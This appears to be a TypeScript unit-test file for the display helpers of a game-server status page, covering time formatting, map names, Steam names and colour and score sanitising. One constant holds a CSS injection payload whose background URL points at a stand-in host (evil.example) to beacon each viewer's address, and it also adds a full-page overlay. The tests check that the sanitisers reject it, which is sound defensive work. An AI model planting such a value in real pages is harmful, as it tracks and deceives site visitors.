import { describe, expect, test } from 'bun:test';
import {
	factionColor,
	fmtAgo,
	fmtSpan,
	hexColor,
	mapId,
	saneScores,
	steamNameBeside
} from './format';

const MIN = 60_000;
const HOUR = 60 * MIN;
const DAY = 24 * HOUR;

describe('fmtSpan', () => {
	test('picks the coarsest unit that still reads', () => {
		expect(fmtSpan(0)).toBe('0 s');
		expect(fmtSpan(40_000)).toBe('40 s');
		expect(fmtSpan(12 * MIN)).toBe('12 min');
		expect(fmtSpan(90 * MIN)).toBe('2 h');
		expect(fmtSpan(35 * HOUR)).toBe('35 h');
		expect(fmtSpan(DAY)).toBe('24 h');
		expect(fmtSpan(36 * HOUR)).toBe('2 days');
		expect(fmtSpan(6 * DAY)).toBe('6 days');
	});
});

describe('fmtAgo', () => {
	const now = Date.parse('2026-09-17T12:00:00Z');
	test('reads as a status line', () => {
		expect(fmtAgo(now - 10_000, now)).toBe('just now');
		expect(fmtAgo(now - 2 * MIN, now)).toBe('2 min ago');
		expect(fmtAgo(now - 4 * HOUR, now)).toBe('4 h ago');
		expect(fmtAgo(now - 3 * DAY, now)).toBe('3 days ago');
	});
	test('takes ISO strings and never goes negative', () => {
		expect(fmtAgo(new Date(now - 5 * MIN).toISOString(), now)).toBe('5 min ago');
		expect(fmtAgo(now + 10 * MIN, now)).toBe('just now');
	});
	test('falls back to the date past a month', () => {
		expect(fmtAgo(now - 47 * DAY, now)).not.toContain('ago');
		expect(fmtAgo('not a date', now)).toBe('not a date');
	});
});

test('mapId: the name players know and the catalog id are one map', () => {
	expect(mapId('NorthAmerica')).toBe('NorthAmerica');
	expect(mapId('Zestafona')).toBe('NorthAmerica');
	expect(mapId('bakurani')).toBe('Kavkazi');
	expect(mapId('SomeNewMap')).toBe('SomeNewMap');
	expect(mapId('')).toBe('');
});

describe('steamNameBeside', () => {
	test('shows the Steam name when the in-game name does not carry it', () => {
		expect(steamNameBeside('Anonymous', 'shadowfox')).toBe('shadowfox');
		expect(steamNameBeside('Lt. Dan', 'dan_1987')).toBe('dan_1987');
		expect(steamNameBeside('Anonymous', '  Kestrel ')).toBe('Kestrel');
		// inside another word is not carrying it
		expect(steamNameBeside('Jordan', 'dan')).toBe('dan');
		expect(steamNameBeside('Ghostpepper2', 'Ghostpepper')).toBe('Ghostpepper');
	});

	test('says nothing when the in-game name already has it, or there is none', () => {
		expect(steamNameBeside('[ABC] Night Owl', 'Night Owl')).toBeNull();
		expect(steamNameBeside('ghostpepper', 'GhostPepper')).toBeNull();
		expect(steamNameBeside('Lt. Dan', 'dan')).toBeNull();
		expect(steamNameBeside('[ABC]xX_Sn1per_Xx', 'xx_sn1per_xx')).toBeNull();
		expect(steamNameBeside('Ｋｅｓｔｒｅｌ', 'Kestrel')).toBeNull();
		expect(steamNameBeside('Anonymous', '')).toBeNull();
		expect(steamNameBeside('Anonymous', '   ')).toBeNull();
		expect(steamNameBeside('Anonymous', null)).toBeNull();
		expect(steamNameBeside('Anonymous', undefined)).toBeNull();
	});
});

// A game server's colours land in style attributes on every viewer's page: anything but #rrggbb
// could carry CSS (a background image that reports each viewer's address, an overlay).
const HOSTILE = 'red;background:url(https://evil.example/beacon?v=1);position:fixed;inset:0';

describe('hexColor', () => {
	test('keeps #rrggbb and nothing else', () => {
		expect(hexColor('#D86060')).toBe('#D86060');
		expect(hexColor('#5b95d8')).toBe('#5b95d8');
		for (const bad of [
			HOSTILE,
			'red',
			'#fff',
			'#12345',
			'#1234567',
			' #D86060',
			'#D86060;',
			'url(x)',
			7,
			null
		])
			expect(hexColor(bad)).toBe('');
	});
});

describe('saneScores', () => {
	test('names as text, colours as #rrggbb or nothing, scores as finite numbers', () => {
		expect(
			saneScores([
				{ name: 'Valkyra', colorHex: '#D86060', score: 34 },
				{ name: 'Lonestar', colorHex: HOSTILE, score: 'abc' },
				{ name: 7, colorHex: '#7BC462', score: '12' },
				null,
				'junk'
			])
		).toEqual([
			{ name: 'Valkyra', colorHex: '#D86060', score: 34 },
			{ name: 'Lonestar', colorHex: '', score: 0 },
			{ name: '7', colorHex: '#7BC462', score: 12 }
		]);
		expect(saneScores(undefined)).toEqual([]);
		expect(saneScores({ scores: [] })).toEqual([]);
	});

	test('factionColor falls back rather than pass a hostile colour on', () => {
		expect(factionColor('Lonestar', [{ name: 'Lonestar', colorHex: HOSTILE, score: 0 }])).toBe(
			'#5E5E66'
		);
		expect(factionColor('Valkyra', [{ name: 'Valkyra', colorHex: '#D86060', score: 0 }])).toBe(
			'#D86060'
		);
	});
});
